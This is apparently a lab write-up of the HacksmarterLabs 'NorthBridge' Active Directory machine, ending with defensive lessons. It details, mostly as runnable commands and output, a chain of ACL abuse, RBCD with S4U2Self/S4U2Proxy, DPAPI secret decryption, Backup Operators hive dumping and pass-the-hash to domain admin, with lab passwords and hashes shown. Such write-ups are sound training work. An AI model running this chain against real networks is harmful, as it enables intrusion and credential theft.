---
title: NorthBridge
categories: [HacksmarterLabs]
tags: [active-directory, smb, rdp, acl-abuse, resource-based-constrained-delegation, rbcd, s4u2self, s4u2proxy, dpapi, backup-operators, secretsdump, machine-account, domain-compromise]
media_subpath: /images/hacksmarter_northbridge/
image:
  path: 'https://images.coursestack.com/21f044de-588a-499f-9cbf-883fd16712c0/07c84940-76bb-4172-8862-acd8136d42bf'
---

## Summary

**NorthBridge** is a HacksmarterLabs Active Directory machine that demonstrates a sophisticated attack chain involving ACL abuse, Resource-Based Constrained Delegation (RBCD), S4U2Self/S4U2Proxy exploitation, DPAPI secrets extraction, and Backup Operators privilege abuse. The attack begins with initial credentials for a security testing service account. After gaining access to a jump server via RDP, we discover hardcoded credentials in automation scripts. By exploiting ACL permissions, we configure Resource-Based Constrained Delegation to impersonate privileged accounts. Through DPAPI secrets extraction, we obtain credentials for a Backup Operators group member, which we leverage to dump domain controller registry hives. Finally, we extract the machine account hash and use it to dump the Administrator hash, achieving complete domain compromise.

## Initial Access

### Provided Credentials

We start with credentials for the following account:
- **Username**: `_securitytestingsvc`
- **Password**: `4kCc$A@NZvNAdK@`

> This represents a realistic scenario where initial access is gained through security testing credentials, social engineering, or other initial compromise vectors.
{: .prompt-info}

## Initial Enumeration

### Network Discovery

We begin by identifying the target systems in the environment:

```bash
nxc smb targets.txt
```

```
SMB         10.1.135.39     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         10.1.90.245     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:None) (Null Auth:True)
```

> The enumeration reveals two systems:
> - **NORTHJMP01** (10.1.135.39): A jump server in the domain
> - **NORTHDC01** (10.1.90.245): The domain controller
{: .prompt-info}

### Environment Configuration

We configure our environment variables for easier navigation:

```bash
set-environment -g DOMAIN "northbridge.corp"
set-environment -g DCFQDN "northdc01.northbridge.corp"
set-environment -g JMPFQDN "northjmp01.northbridge.corp"
set-environment -g DCHOSTNAME "northdc01"
set-environment -g JMPHOSTNAME "northjmp01"
set-environment -g DCIP "10.1.90.245"
set-environment -g JMPIP "10.1.135.39"
set-environment -g USERAD "_securitytestingsvc"
set-environment -g PASS "4kCc$A@NZvNAdK@"
```

We also add the hosts to `/etc/hosts`:

```bash
10.1.90.245  northdc01.northbridge.corp northbridge.corp
10.1.135.39 northjmp01.northbridge.corp northjmp01
```

## Jump Server Access

### RDP Authentication

We test RDP access to the jump server:

```bash
nxc rdp $JMPFQDN -u $USERAD -p $PASS
```

```
RDP         10.1.135.39     3389   NORTHJMP01       [*] Windows 10 or Windows Server 2016 Build 20348 (name:NORTHJMP01) (domain:northbridge.corp) (nla:True)
RDP         10.1.135.39     3389   NORTHJMP01       [+] northbridge.corp\_securitytestingsvc:4kCc$A@NZvNAdK@ (Pwn3d!)
```

> **RDP Access Success**: We successfully authenticated to the jump server via RDP. The `(Pwn3d!)` indicator confirms we have administrative access.
{: .prompt-info}

### Connecting via RDP

We connect to the jump server using `xfreerdp3`:

```bash
xfreerdp3 /dynamic-resolution /v:$JMPIP /u:$USERAD /p:$PASS
```

![RDP Connection to Jump Server](file-20251120161653570.png)

> We successfully connected to the jump server. This provides us with a graphical interface to explore the system and discover additional credentials or misconfigurations.
{: .prompt-info}

## Credential Discovery

### Exploring Scripts Directory

On the jump server, we explore the `C:\Scripts` directory and discover a folder named "Server Build Automation":

```
C:\Scripts\Server Build Automation>type Readme.txt
This script is used to automate the process of creating computer accounts, joining them to the domain, configuring servers with standard software and security stack and a local administrator account. Previously, this was a manual and time-consuming task for the IT teams, but as part of Project Falcon, we are working to streamline and automate these repetitive server provisioning workflows.

The script assumes it is being executed by an account with delegated permissions to create computer objects within the Servers OU of the domain. If you are unsure how the staging process works or where to put servers that are being built, please contact Emily Rhodes.

Note: The script currently stages new computer objects into a specific sub-OU within the Servers OU but will need to be moved into their final OU once the server build-out is complete.

Example usage:
"C:\Scripts\Server Build Automation\ServerBuildAutomation.ps1" -DomainName northbridge.local -DomainJoinUser _svrautomationsvc -DomainJoinPassword yf0@EoWY4cXqmVv

This script will also create a new local administrator account during provisioning. We are working with Samantha to integrate LAPS, but for now, we have been granted a temporary exception to use a standard local administrator during the server build process.
```

> **Critical Discovery**: The Readme.txt file contains hardcoded credentials for the `_svrautomationsvc` service account:
> - **Username**: `_svrautomationsvc`
> - **Password**: `yf0@EoWY4cXqmVv`
> 
> This is a common security issue where credentials are stored in plaintext documentation or scripts.
{: .prompt-danger}

### Testing Automation Service Account

We test the discovered credentials:

```bash
nxc smb $JMPFQDN -u _svrautomationsvc -p 'yf0@EoWY4cXqmVv'
```

```
SMB         10.1.135.39     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         10.1.135.39     445    NORTHJMP01       [+] northbridge.corp\_svrautomationsvc:yf0@EoWY4cXqmVv
```

> **Credential Validation**: The credentials are valid. The `_svrautomationsvc` account may have additional permissions that we can exploit.
{: .prompt-info}

## ACL Enumeration and Abuse

### Enumerating Writable Objects

We enumerate writable objects using `bloodyAD` to identify what permissions `_svrautomationsvc` has:

```bash
bloodyAD --json --host $DCFQDN -d $DOMAIN -u $USERAD -p $PASS get writable --detail |jq '.[] |select(.distinguishedName=="CN=NORTHJMP01,OU=Production,OU=Servers,DC=northbridge,DC=corp")'
```

The enumeration reveals critical permissions:

```json
{
  "distinguishedName": "CN=NORTHJMP01,OU=Production,OU=Servers,DC=northbridge,DC=corp",
  "msDS-AllowedToActOnBehalfOfOtherIdentity": [
    "WRITE"
  ],
  "accountExpires": [
    "WRITE"
  ],
  "userParameters": [
    "WRITE"
  ],
  "pwdLastSet": [
    "WRITE"
  ],
  "userAccountControl": [
    "WRITE"
  ]
}
```

![ACL Enumeration Results](file-20251120162117925.png)

> **Critical Discovery**: The `_svrautomationsvc` account has `WRITE` permissions over the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the `NORTHJMP01` computer object. This attribute controls Resource-Based Constrained Delegation (RBCD), allowing us to configure delegation rights.
{: .prompt-danger}

### Understanding Resource-Based Constrained Delegation

Resource-Based Constrained Delegation (RBCD) is a security feature that allows a service account to impersonate users when accessing a specific resource. Unlike traditional constrained delegation, RBCD is configured on the resource (target) side, not the service account side.

The `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a computer object specifies which accounts are allowed to delegate to that computer. By writing to this attribute, we can grant ourselves delegation rights.

## Resource-Based Constrained Delegation Configuration

### Configuring RBCD

We use `rbcd.py` from Impacket to configure RBCD, allowing `_svrautomationsvc` to delegate to `NORTHJMP01$`:

```bash
rbcd.py -delegate-from _svrautomationsvc -delegate-to 'northjmp01$' -dc-ip $DCIP -action 'write' $DOMAIN/$USERAD:$PASS
```

> Command breakdown:
> - `rbcd.py`: Impacket tool for managing RBCD
> - `-delegate-from _svrautomationsvc`: The account that will perform delegation
> - `-delegate-to 'northjmp01$'`: The target computer account
> - `-dc-ip $DCIP`: Domain controller IP address
> - `-action 'write'`: Write the delegation configuration
> - `$DOMAIN/$USERAD:$PASS`: Authentication credentials
{: .prompt-info}

The configuration is successful:

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] _svrautomationsvc can now impersonate users on northjmp01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     _svrautomationsvc   (S-1-5-21-1010595023-1608570688-3264491749-1124)
```

> **RBCD Configuration Success**: We successfully configured Resource-Based Constrained Delegation, allowing `_svrautomationsvc` to impersonate users when accessing `NORTHJMP01$`. This enables us to use S4U2Self and S4U2Proxy to obtain tickets for other users.
{: .prompt-warning}

### Verifying Delegation

We verify the delegation configuration using `findDelegation.py`:

```bash
findDelegation.py -dc-host $DCHOSTNAME -dc-ip $DCIP $DOMAIN/$USERAD:$PASS
```

```
AccountName        AccountType  DelegationType              DelegationRightsTo  SPN Exists
-----------------  -----------  --------------------------  ------------------  ----------
NORTHDC01$         Computer     Unconstrained               N/A                 Yes
_svrautomationsvc  Person       Resource-Based Constrained  NORTHJMP01$         No
```

> The delegation is properly configured. `_svrautomationsvc` now has Resource-Based Constrained Delegation rights to `NORTHJMP01$`.
{: .prompt-info}

## S4U2Self/S4U2Proxy Exploitation

### Understanding S4U2Self/S4U2Proxy

The S4U2Self/S4U2Proxy protocol allows a service account to request a service ticket on behalf of another user. This is the mechanism that makes RBCD exploitation possible:

1. **S4U2Self**: The service account requests a ticket to itself, impersonating the target user
2. **S4U2Proxy**: The service account uses the S4U2Self ticket to request a service ticket to the target resource

### Identifying Target Accounts

We check the local administrators group on the jump server to identify privileged accounts:

```
C:\Scripts\Server Build Automation>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
NORTHBRIDGE\Domain Admins
NORTHBRIDGE\NORTHJMP01PRIV
```

![Local Administrators Group](file-20251120163611868.png)

> We discover that `NORTHJMP01PRIV` is a domain group with local administrator privileges on the jump server. This group may contain privileged accounts that we can impersonate.
{: .prompt-info}

### Enumerating Group Members

We enumerate members of the `NORTHJMP01PRIV` group:

```bash
nxc ldap $DCFQDN -u $USERAD -p $PASS --groups "NORTHJMP01PRIV"
```

```
LDAP        10.1.90.245     389    NORTHDC01        [*] Windows Server 2022 Build 20348 (name:NORTHDC01) (domain:northbridge.corp) (signing:None) (channel binding:Never)
LDAP        10.1.90.245     389    NORTHDC01        [+] northbridge.corp\_securitytestingsvc:4kCc$A@NZvNAdK@
LDAP        10.1.90.245     389    NORTHDC01        Samantha McCormick (T1 Admin Account)
LDAP        10.1.90.245     389    NORTHDC01        Robert Hall (T1 Admin Account)
LDAP        10.1.90.245     389    NORTHDC01        Marty Lee (T1 Admin Account)
LDAP        10.1.90.245     389    NORTHDC01        Gloria Cook (T1 Admin Account)
```

> The group contains several T1 Admin accounts. We'll use `rhallt1` (Robert Hall) as our target for impersonation.
{: .prompt-info}

### Obtaining TGT and Session Key

To perform the S4U2Self/S4U2Proxy attack, we need to:
1. Obtain a TGT (Ticket Granting Ticket) for `_svrautomationsvc`
2. Extract the session key from the TGT
3. Change the password of `_svrautomationsvc` to match the session key
4. Use the modified credentials to perform S4U2Self/S4U2Proxy

First, we obtain the NT hash of the current password:

```bash
pypykatz crypto nt $PASS
```

```
5ae61e2f926ba33fc83162a55cca0950
```

We obtain a TGT using the NT hash:

```bash
getTGT.py $DOMAIN/$USERAD -hashes :5ae61e2f926ba33fc83162a55cca0950 -dc-ip $DCIP
```

```
[*] Saving ticket in _svrautomationsvc.ccache
```

We extract the ticket session key:

```bash
describeTicket.py _svrautomationsvc.ccache|grep 'Ticket Session Key'
```

```
[*] Ticket Session Key            : d2c926e4c6fac93f5db55f3c25e43a56
```

### Changing Password to Session Key

We change the password of `_svrautomationsvc` to match the session key hash:

```bash
changepasswd.py $DOMAIN/$USERAD@$DCIP -hashes :5ae61e2f926ba33fc83162a55cca0950 -newhash :d2c926e4c6fac93f5db55f3c25e43a56
```

```
[*] Changing the password of northbridge.corp\_svrautomationsvc
[*] Connecting to DCE/RPC as northbridge.corp\_svrautomationsvc
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

> **Password Change Success**: We successfully changed the password of `_svrautomationsvc` to match the session key. This allows us to use the cached TGT for authentication, which is necessary for the S4U2Self/S4U2Proxy attack.
{: .prompt-warning}

### Requesting Service Ticket via S4U2Proxy

We use `getST.py` to perform the S4U2Self/S4U2Proxy attack, impersonating `rhallt1`:

```bash
KRB5CCNAME=_svrautomationsvc.ccache getST.py -u2u -impersonate rhallt1 -spn CIFS/$JMPFQDN -no-pass $DOMAIN/$USERAD -dc-ip $DCIP
```

> Command breakdown:
> - `KRB5CCNAME=_svrautomationsvc.ccache`: Use the cached TGT
> - `getST.py`: Impacket tool to request service tickets
> - `-u2u`: User-to-User authentication (required for S4U2Self)
> - `-impersonate rhallt1`: User to impersonate
> - `-spn CIFS/$JMPFQDN`: Service Principal Name for SMB on the jump server
> - `-no-pass`: Use cached credentials
> - `$DOMAIN/$USERAD`: Service account credentials
> - `-dc-ip $DCIP`: Domain controller IP
{: .prompt-info}

The attack is successful:

```
[*] Impersonating rhallt1
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in rhallt1@CIFS_northjmp01.northbridge.corp@NORTHBRIDGE.CORP.ccache
```

> **S4U2Self/S4U2Proxy Success**: We successfully obtained a service ticket for `rhallt1` by exploiting Resource-Based Constrained Delegation. The S4U2Self/S4U2Proxy protocol allowed us to impersonate `rhallt1` when accessing the jump server.
{: .prompt-danger}

### Accessing Jump Server as rhallt1

We export the Kerberos ticket and access the jump server:

```bash
export KRB5CCNAME=rhallt1@CIFS_northjmp01.northbridge.corp@NORTHBRIDGE.CORP.ccache
nxc smb $JMPFQDN -k --use-kcache --shares
```

```
SMB         northjmp01.northbridge.corp 445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         northjmp01.northbridge.corp 445    NORTHJMP01       [+] northbridge.corp\rhallt1 from ccache (Pwn3d!)
SMB         northjmp01.northbridge.corp 445    NORTHJMP01       [*] Enumerated shares
SMB         northjmp01.northbridge.corp 445    NORTHJMP01       Share           Permissions     Remark
SMB         northjmp01.northbridge.corp 445    NORTHJMP01       -----           -----------     ------
SMB         northjmp01.northbridge.corp 445    NORTHJMP01       ADMIN$          READ,WRITE      Remote Admin
SMB         northjmp01.northbridge.corp 445    NORTHJMP01       C$              READ,WRITE      Default share
SMB         northjmp01.northbridge.corp 445    NORTHJMP01       IPC$            READ            Remote IPC
SMB         northjmp01.northbridge.corp 445    NORTHJMP01       Network Shares  READ,WRITE
```

> We successfully authenticated as `rhallt1` using the delegated ticket. The `(Pwn3d!)` indicator shows we have administrative access to the jump server.
{: .prompt-info}

## DPAPI Secrets Extraction

### Discovering Backup Scripts

While exploring the jump server, we discover a folder named "AD Domain Backup" in `C:\Scripts`:

```
Directory of C:\Scripts\AD Domain Backup

09/21/2025  02:44 AM    <DIR>          .
09/21/2025  02:34 AM    <DIR>          ..
09/21/2025  02:33 AM               756 Invoke-NorthADBackup.ps1
09/21/2025  02:44 AM               718 Password.txt
09/21/2025  02:33 AM             1,336 Readme.txt
```

The Readme.txt file contains important information:

```
This script is used to streamline the process of backing up the Northbridge Active Directory environment. I am currently working with Samantha in security to strengthen the backup workflow and reduce the risk of accidental credential exposure. The service account used in this process is a member of the Backup Operators group, so we need to take additional precautions to limit where and how its credentials are stored and accessed.

The script used to contain hardcoded credentials for the backup account, but it was flagged during our last internal security audit. As a stopgap measure, the script was updated to use PowerShell SecureString so that the password was not stored in plaintext. This same account is still used by an automated process via the task scheduler until we are in a good spot to transition to using our PAM solution or managed service accounts.

## Command used to generate secure string
"<password>" | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString | Out-File "C:\Scripts\AD Domain Backup\Password.txt"

## Part of script that references this secure string
$securePassword = Get-Content $passwordFile | ConvertTo-SecureString
$cred = New-Object System.Management.Automation.PSCredential ($username, $securePassword)

Please reach out to Emily Rhodes if you have any questions.
```

The script reveals the username:

```powershell
# Path to password file
$passwordFile = "C:\Scripts\AD Domain Backup\Password.txt"
$username = "northbridge\_backupsvc"
$backupLocation = "E:\ADBackups"

# Read and convert the password
$securePassword = Get-Content $passwordFile | ConvertTo-SecureString
$cred = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
```

The Password.txt file contains a DPAPI-encrypted SecureString:

```
01000000d08c9ddf0115d1118c7a00c04fc297eb0100000023053a472ff63e46b44a38e3ab85ce590000000002000000000003660000c000000010000000fdb7034a60b89eaa14c81eadc0a2e5740000000004800000a00000001000000009380983c9624b1cc4a64fa29dbeb6e428000000bbd040a75628fbddf267b0aec9526c1f8e8a461b0ac8bc52eec08364bb64b028ce259d837bef80c8140000003b193b86fbf049e8193aa3881a35e26ef4e8649e
```

> **DPAPI-Encrypted Credentials**: The password is stored as a PowerShell SecureString, which uses DPAPI (Data Protection API) for encryption. DPAPI-encrypted data can be decrypted if we have access to the master keys on the system where it was encrypted.
{: .prompt-warning}

### Extracting DPAPI Secrets

We use NetExec's DPAPI module to extract and decrypt secrets from the jump server:

```bash
nxc smb $JMPFQDN -k --use-kcache --dpapi
```

> Command breakdown:
> - `nxc smb`: NetExec SMB module
> - `-k --use-kcache`: Use Kerberos authentication with cached ticket
> - `--dpapi`: Extract and decrypt DPAPI secrets
{: .prompt-info}

The extraction is successful:

```
SMB         northjmp01.northbridge.corp 445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         northjmp01.northbridge.corp 445    NORTHJMP01       [+] northbridge.corp\rhallt1 from ccache (Pwn3d!)
SMB         northjmp01.northbridge.corp 445    NORTHJMP01       [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         northjmp01.northbridge.corp 445    NORTHJMP01       [+] Got 65 decrypted masterkeys. Looting secrets...
SMB         northjmp01.northbridge.corp 445    NORTHJMP01       [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{749E95F2-638A-4C24-B478-22FB7A4BED13} - NORTHBRIDGE\_backupsvc:j0$QyPZ0JWzN2*iu^5
```

> **DPAPI Decryption Success**: We successfully extracted and decrypted DPAPI secrets, revealing the password for `_backupsvc`:
> - **Username**: `_backupsvc`
> - **Password**: `j0$QyPZ0JWzN2*iu^5`
> 
> The credentials were stored in a Task Scheduler credential, which was accessible through DPAPI master keys.
{: .prompt-danger}

### Verifying Backup Operators Membership

We verify that `_backupsvc` is a member of the Backup Operators group:

```bash
bloodyAD --host $DCFQDN -d $DOMAIN -u $USERAD -p $PASS get membership $USERAD
```

```
distinguishedName: CN=Users,CN=Builtin,DC=northbridge,DC=corp
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Backup Operators,CN=Builtin,DC=northbridge,DC=corp
objectSid: S-1-5-32-551
sAMAccountName: Backup Operators

distinguishedName: CN=Domain Users,OU=Groups,DC=northbridge,DC=corp
objectSid: S-1-5-21-1010595023-1608570688-3264491749-513
sAMAccountName: Domain Users
```

> **Backup Operators Confirmed**: The `_backupsvc` account is a member of the Backup Operators group. This group has the `SeBackupPrivilege` and `SeRestorePrivilege` privileges, which allow reading and writing files regardless of their permissions, including registry hives.
{: .prompt-warning}

## Backup Operators Privilege Abuse

### Understanding Backup Operators Privileges

The Backup Operators group has two critical privileges:
- **SeBackupPrivilege**: Allows reading files regardless of permissions
- **SeRestorePrivilege**: Allows writing files regardless of permissions

These privileges can be abused to:
1. Read registry hives (SAM, SYSTEM, SECURITY) from the domain controller
2. Extract password hashes from the registry
3. Dump the NTDS.dit database (with additional techniques)

### Dumping Registry Hives

We use NetExec's `backup_operator` module to dump the registry hives from the domain controller:

```bash
nxc smb $DCFQDN -u $USERAD -p $PASS -M backup_operator
```

> Command breakdown:
> - `nxc smb`: NetExec SMB module
> - `-u $USERAD -p $PASS`: Authenticate as _backupsvc
> - `-M backup_operator`: Execute the backup_operator module to dump registry hives
{: .prompt-info}

The dump process begins:

```
SMB         10.1.90.245     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.90.245     445    NORTHDC01        [+] northbridge.corp\_backupsvc:j0$QyPZ0JWzN2*iu^5
BACKUP_O... 10.1.90.245     445    NORTHDC01        [*] Triggering RemoteRegistry to start through named pipe...
BACKUP_O... 10.1.90.245     445    NORTHDC01        Saved HKLM\SAM to \\10.1.90.245\SYSVOL\SAM
BACKUP_O... 10.1.90.245     445    NORTHDC01        Saved HKLM\SYSTEM to \\10.1.90.245\SYSVOL\SYSTEM
BACKUP_O... 10.1.90.245     445    NORTHDC01        Saved HKLM\SECURITY to \\10.1.90.245\SYSVOL\SECURITY
SMB         10.1.90.245     445    NORTHDC01        [*] Copying "SAM" to "/home/h4z4rd0u5/.nxc/logs/NORTHDC01_10.1.90.245_2025-11-20_164555.SAM"
SMB         10.1.90.245     445    NORTHDC01        [+] File "SAM" was downloaded to "/home/h4z4rd0u5/.nxc/logs/NORTHDC01_10.1.90.245_2025-11-20_164555.SAM"
SMB         10.1.90.245     445    NORTHDC01        [*] Copying "SECURITY" to "/home/h4z4rd0u5/.nxc/logs/NORTHDC01_10.1.90.245_2025-11-20_164555.SECURITY"
SMB         10.1.90.245     445    NORTHDC01        [+] File "SECURITY" was downloaded to "/home/h4z4rd0u5/.nxc/logs/NORTHDC01_10.1.90.245_2025-11-20_164555.SECURITY"
SMB         10.1.90.245     445    NORTHDC01        [*] Copying "SYSTEM" to "/home/h4z4rd0u5/.nxc/logs/NORTHDC01_10.1.90.245_2025-11-20_164555.SYSTEM"
SMB         10.1.90.245     445    NORTHDC01        [-] Error writing file "SYSTEM" from share "SYSVOL": ("Unpacked data doesn't match constant value 'b'x_\\xc7H'' should be ''þSMB''", 'When unpacking field \'ProtocolID | "þSMB | b\'x_\\xc7H\\xfd!\\x1bq\\<ERRORSNIP>
BACKUP_O... 10.1.90.245     445    NORTHDC01        [-] Fail to dump the sam and lsa: unpack requires a buffer of 4 bytes
```

> The automated dump encountered an error with the SYSTEM hive, but SAM and SECURITY were successfully downloaded. We can manually retrieve the SYSTEM hive using SMB client.
{: .prompt-info}

### Manually Retrieving SYSTEM Hive

We use `smbclient.py` to manually retrieve the SYSTEM hive:

```bash
smbclient.py $DOMAIN/$USERAD:$PASS@$FQDN
```

```bash
# use sysvol
# ls
drw-rw-rw-          0  Thu Nov 20 16:46:03 2025 .
drw-rw-rw-          0  Sat Sep 20 22:34:42 2025 ..
drw-rw-rw-          0  Sun Sep 21 00:07:37 2025 northbridge.corp
-rw-rw-rw-      28672  Thu Nov 20 16:46:00 2025 SAM
-rw-rw-rw-      32768  Thu Nov 20 16:46:03 2025 SECURITY
-rw-rw-rw-   18120704  Thu Nov 20 16:46:02 2025 SYSTEM
# get SYSTEM
# get sam
# get security
```

> We successfully retrieved all three registry hives (SAM, SYSTEM, SECURITY) from the domain controller. These hives contain password hashes and other sensitive information.
{: .prompt-info}

## Domain Compromise

### Extracting Hashes from Registry

We use `secretsdump.py` to extract password hashes from the dumped registry hives:

```bash
secretsdump.py -sam sam -system SYSTEM -security security LOCAL
```

> Command breakdown:
> - `secretsdump.py`: Impacket tool to extract secrets from registry hives
> - `-sam sam`: Path to SAM hive
> - `-system SYSTEM`: Path to SYSTEM hive
> - `-security security`: Path to SECURITY hive
> - `LOCAL`: Treat as local system (not domain)
{: .prompt-info}

The extraction reveals several important secrets:

```
[*] Target system bootKey: 0x3e0eb193a4a162929f6e25fc2644e31d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1e810164bd53c3e4e91872ff347bd808:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:70e54745fbdad34de01aedd848feadc89599f9b40849ed80186443bc9868509320e316745215e0470df660b2302f413ad72cf47d5ca1914a45bec52cb95cb201ee596cd0662fe96842aa842ac360cf3c2e30cbc4c232134e2631ed7d7baa07cdcfe769905261f8f6728a8b79201629da90b153a81a8a2f722a463ff74b0493a4110ed02b170c2bcd716368d44c776dc6a2e4da008bdef4141604f1a85b6a9a1b980f114b4921a1235a59baf85b24933b16d17ff5f04206306093f15e17ac3e1b853b3980d7b9597fbe5db119d7df9e49ecceb2ae09b8ade7467bf07a6ef4e37f571fb108456faa726b3edeab0b9c3040
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7f49c490a1dc5b36d883147b83992ad6
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xd967e6085663179d4ba9c8e203e6ac4c5aa24b70
dpapi_userkey:0xfb2477b81c0c2a0d69590a0856315e5b2145de79
[*] NL$KM 
 0000   B6 96 C7 7E 17 8A 0C DD  8C 39 C2 0A A2 91 24 44   ...~.....9....$D
 0010   A2 E4 4D C2 09 59 46 C0  7F 95 EA 11 CB 7F CB 72   ..M..YF........r
 0020   EC 2E 5A 06 01 1B 26 FE  6D A7 88 0F A5 E7 1F A5   ..Z...&.m.......
 0030   96 CD E5 3F A0 06 5E C1  A5 01 A1 CE 8C 24 76 95   ...?..^......$v.
NL$KM:b696c77e178a0cdd8c39c20aa2912444a2e44dc2095946c07f95ea11cb7fcb72ec2e5a06011b26fe6da7880fa5e71fa596cde53fa0065ec1a501a1ce8c247695
[*] Cleaning up... 
```

> **Critical Discovery**: We extracted the machine account hash for `NORTHDC01$`:
> - **Machine Account**: `NORTHDC01$`
> - **NTLM Hash**: `7f49c490a1dc5b36d883147b83992ad6`
> 
> Machine account hashes can be used to authenticate to the domain controller and perform DCSync attacks to extract domain credentials.
{: .prompt-danger}

### Authenticating with Machine Account

We test authentication using the machine account hash:

```bash
nxc smb $DCFQDN -u 'NORTHDC01$' -H 7f49c490a1dc5b36d883147b83992ad6
```

```
SMB         10.1.90.245     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.90.245     445    NORTHDC01        [+] northbridge.corp\NORTHDC01$:7f49c490a1dc5b36d883147b83992ad6 
```

> **Machine Account Authentication Success**: We successfully authenticated using the domain controller's machine account hash (`NORTHDC01$`). Domain controller machine accounts have high privileges in Active Directory and can be used to perform DCSync attacks to extract domain credentials.
{: .prompt-info}

### Dumping Administrator Hash

We use `secretsdump.py` with the machine account hash to dump the Administrator password hash:

```bash
secretsdump.py $DOMAIN/'NORTHDC01$'@$FQDN -hashes :7f49c490a1dc5b36d883147b83992ad6 -just-dc-user Administrator
```

> Command breakdown:
> - `secretsdump.py`: Impacket tool to extract secrets
> - `$DOMAIN/'NORTHDC01$'@$FQDN`: Authenticate as machine account
> - `-hashes :7f49c490a1dc5b36d883147b83992ad6`: Use NTLM hash for authentication
> - `-just-dc-user Administrator`: Only dump the Administrator account
{: .prompt-info}

The dump is successful:

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8b61f9dfb32c8209f4ac9e2a5c2269cc:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9e5776e9ff027f2bc24a2c714e1853cfc4ee2ec94489d4ab43f4c720004c1ab0
Administrator:aes128-cts-hmac-sha1-96:7ae8ecb4c4cc402e58a117a59d0a7045
Administrator:des-cbc-md5:3e37b68cad1a13c7
[*] Cleaning up... 
```

> **Domain Compromise**: We successfully extracted the Administrator NTLM hash:
> - **Administrator Hash**: `8b61f9dfb32c8209f4ac9e2a5c2269cc`
> 
> This enables complete domain access and control.
{: .prompt-danger}

### Accessing Domain Controller

We use `evil-winrm-py` to access the domain controller as Administrator:

```bash
evil-winrm-py -i $DCIP -u Administrator -H 8b61f9dfb32c8209f4ac9e2a5c2269cc
```

```
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '10.1.90.245:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> cd ..\desktop
dir
evil-winrm-py PS C:\Users\Administrator\desktop> dir


    Directory: C:\Users\Administrator\desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        11/17/2025   5:02 PM            544 root.txt
```

> **Domain Compromise Complete**: We successfully accessed the domain controller as Administrator and can retrieve the root flag from the Desktop.
{: .prompt-info}

## Conclusion

### Quick Recap

- Initial access was provided through credentials for `_securitytestingsvc`
- RDP access to the jump server revealed hardcoded credentials in automation scripts
- The `_svrautomationsvc` account had ACL permissions to configure RBCD
- Resource-Based Constrained Delegation was configured on `NORTHJMP01$`
- S4U2Self/S4U2Proxy attack impersonated `rhallt1` to gain privileged access
- DPAPI secrets extraction revealed `_backupsvc` credentials
- Backup Operators privileges were abused to dump registry hives from the domain controller
- Machine account hash was extracted and used to dump Administrator hash
- Complete domain compromise was achieved

### Lessons Learned

- **Credential Storage**: Credentials should never be stored in plaintext documentation or scripts, even in "readme" files
- **SecureString Security**: PowerShell SecureString provides minimal protection and can be decrypted with DPAPI master keys
- **Access Control Lists**: Proper ACL management is critical to prevent unauthorized modifications to computer objects
- **Resource-Based Constrained Delegation**: RBCD should be carefully configured and monitored to prevent unauthorized delegation
- **Backup Operators Group**: The Backup Operators group has powerful privileges that can be abused to extract sensitive information
- **Machine Account Security**: Machine accounts should be treated with the same security considerations as privileged user accounts
- **Defense in Depth**: Multiple security controls should protect critical systems and prevent privilege escalation
- **Service Account Security**: Service accounts with elevated privileges should be carefully protected and monitored
- **DPAPI Protection**: DPAPI-encrypted data can be decrypted if master keys are accessible, so additional protection mechanisms should be used for sensitive credentials
